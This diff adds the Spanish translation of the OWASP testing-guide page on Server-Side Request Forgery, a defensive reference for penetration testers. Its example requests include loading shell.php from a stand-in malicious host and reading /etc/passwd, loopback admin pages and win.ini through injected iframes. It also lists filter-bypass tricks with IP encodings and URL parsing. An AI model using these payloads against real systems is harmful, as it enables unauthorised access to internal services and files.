@@ -1,0 +1,82 @@
+<h1 id="server-side-request-forgery">Server-Side Request Forgery</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-INJT-19</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>Las aplicaciones web a menudo interactúan con recursos internos o externos. Aunque se pueda esperar que solo el recurso previsto maneje los datos que se envían, los datos manejados de forma inadecuada pueden crear una situación en la que sean posibles ataques de inyección. Un tipo de ataque de inyección se denomina Server-side Request Forgery (SSRF). Un ataque SSRF exitoso puede otorgar al atacante acceso a acciones restringidas, servicios internos o archivos internos dentro de la aplicación o de la organización. En algunos casos, incluso puede conducir a ejecución remota de código (RCE).</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar los puntos de inyección SSRF.</li>
+<li>Probar si los puntos de inyección son explotables.</li>
+<li>Evaluar la severidad de la vulnerabilidad.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<p>Al probar SSRF, se intenta hacer que el servidor objetivo cargue o guarde involuntariamente contenido que podría ser malicioso. La prueba más común es la de inclusión de archivos locales y remotos. Hay también otra faceta de SSRF: una relación de confianza que a menudo surge cuando el servidor de aplicaciones puede interactuar con otros sistemas de back-end que no son directamente accesibles para los usuarios. Estos sistemas de back-end suelen tener direcciones IP privadas no enrutables o están restringidos a ciertos hosts. Como están protegidos por la topología de red, a menudo carecen de controles más sofisticados. Estos sistemas internos suelen contener datos o funcionalidades sensibles.</p>
+<p>Considérese la siguiente petición:</p>
+<pre><code class="language-http">GET https://example.com/page?page=about.php
+</code></pre>
+<p>Se puede probar esta petición con los siguientes payloads.</p>
+<h3 id="load-the-contents-of-a-file">Cargar el contenido de un archivo</h3>
+<pre><code class="language-http">GET https://example.com/page?page=https://malicioussite.com/shell.php
+</code></pre>
+<h3 id="access-a-restricted-page">Acceder a una página restringida</h3>
+<pre><code class="language-http">GET https://example.com/page?page=http://localhost/admin
+</code></pre>
+<p>O bien:</p>
+<pre><code class="language-http">GET https://example.com/page?page=http://127.0.0.1/admin
+</code></pre>
+<p>Se utiliza la interfaz de loopback para acceder a contenido restringido únicamente al host. Este mecanismo implica que, si se tiene acceso al host, también se tienen privilegios para acceder directamente a la página <code>admin</code>.</p>
+<p>Este tipo de relaciones de confianza, en las que las peticiones originadas en la máquina local se tratan de manera diferente a las peticiones ordinarias, son a menudo lo que permite que SSRF sea una vulnerabilidad crítica.</p>
+<h3 id="fetch-a-local-file">Obtener un archivo local</h3>
+<pre><code class="language-http">GET https://example.com/page?page=file:///etc/passwd
+</code></pre>
+<h3 id="http-methods-used">Métodos HTTP utilizados</h3>
+<p>Todos los payloads anteriores pueden aplicarse a cualquier tipo de petición HTTP, y también podrían inyectarse en valores de cabeceras y cookies.</p>
+<p>Una nota importante sobre SSRF con peticiones POST es que el SSRF también puede manifestarse de forma ciega (blind), porque la aplicación puede no devolver nada de inmediato. En cambio, los datos inyectados pueden usarse en otras funcionalidades, como informes en PDF, manejo de facturas o pedidos, etc., que pueden ser visibles para empleados o personal, pero no necesariamente para el usuario final o el evaluador.</p>
+<p>Se puede encontrar más información sobre Blind SSRF <a href="https://portswigger.net/web-security/ssrf/blind" target="_blank" rel="noopener">aquí</a>, o en la <a href="#/4-Web_Application_Security_Testing/07-Injection/19-Server-Side_Request_Forgery@references">sección de referencias</a>.</p>
+<h3 id="pdf-generators">Generadores de PDF</h3>
+<p>En algunos casos, un servidor puede convertir archivos subidos al formato PDF. Se debe intentar inyectar elementos <code>&lt;iframe&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;base&gt;</code> o <code>&lt;script&gt;</code>, o funciones CSS <code>url()</code> que apunten a servicios internos.</p>
+<pre><code class="language-html">&lt;iframe src=&quot;file:///etc/passwd&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;
+&lt;iframe src=&quot;file:///c:/windows/win.ini&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;
+</code></pre>
+<h3 id="common-filter-bypass">Elusión de filtros comunes</h3>
+<p>Algunas aplicaciones bloquean las referencias a <code>localhost</code> y <code>127.0.0.1</code>. Esto puede eludirse mediante:</p>
+<ul>
+<li>El uso de representaciones alternativas de IP que se evalúan como <code>127.0.0.1</code>:<ul>
+<li>Notación decimal: <code>2130706433</code></li>
+<li>Notación octal: <code>017700000001</code></li>
+<li>Abreviatura de IP: <code>127.1</code></li>
+<li>IP alternativas tratadas como loopback: <code>127.0.0.2</code></li>
+</ul>
+</li>
+<li>Ofuscación de cadenas</li>
+<li>Crear un DNS público en un dominio de su propiedad que se resuelva a <code>127.0.0.1</code></li>
+</ul>
+<p>A veces la aplicación permite una entrada que coincide con cierta expresión, como un dominio. Esto puede eludirse si el analizador del esquema de URL no está correctamente implementado, lo que da lugar a ataques similares a los <a href="https://tools.ietf.org/html/rfc3986#section-7.6" target="_blank" rel="noopener">ataques semánticos</a>.</p>
+<ul>
+<li>Usar el carácter <code>@</code> para separar la información de usuario (userinfo) del host: <code>https://expected-domain@attacker-domain</code></li>
+<li>Fragmentación de la URL con el carácter <code>#</code>: <code>https://attacker-domain#expected-domain</code></li>
+<li>Codificación URL</li>
+<li>Fuzzing</li>
+<li>Combinaciones de todo lo anterior</li>
+</ul>
+<p>Para ver payloads adicionales y técnicas de elusión, consulte la sección de <a href="#/4-Web_Application_Security_Testing/07-Injection/19-Server-Side_Request_Forgery@references">referencias</a>.</p>
+<h2 id="remediation">Corrección</h2>
+<p>Se sabe que SSRF es uno de los ataques más difíciles de derrotar sin el uso de listas de permitidos que requieran permitir IP y URL específicas. Para más información sobre la prevención de SSRF, lea la <a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">Server Side Request Forgery Prevention Cheatsheet</a>.</p>
+<h2 id="references">Referencias</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener">swisskyrepo: SSRF Payloads</a></li>
+<li><a href="https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb" target="_blank" rel="noopener">Reading Internal Files Using SSRF Vulnerability</a></li>
+<li><a href="https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/" target="_blank" rel="noopener">Abusing the AWS Metadata Service Using SSRF Vulnerabilities</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP Server Side Request Forgery Prevention Cheatsheet</a></li>
+<li><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener">Portswigger: SSRF</a></li>
+<li><a href="https://portswigger.net/web-security/ssrf/blind" target="_blank" rel="noopener">Portswigger: Blind SSRF</a></li>
+<li><a href="https://www.bugcrowd.com/resources/levelup/server-side-forgery-request/" target="_blank" rel="noopener">Bugcrowd Webinar: SSRF</a></li>
+<li><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="noopener">Hackerone Blog: SSRF</a></li>
+<li><a href="https://www.hacker101.com/sessions/ssrf.html" target="_blank" rel="noopener">Hacker101: SSRF</a></li>
+<li><a href="https://tools.ietf.org/html/rfc3986" target="_blank" rel="noopener">URI Generic Syntax</a></li>
+</ul>
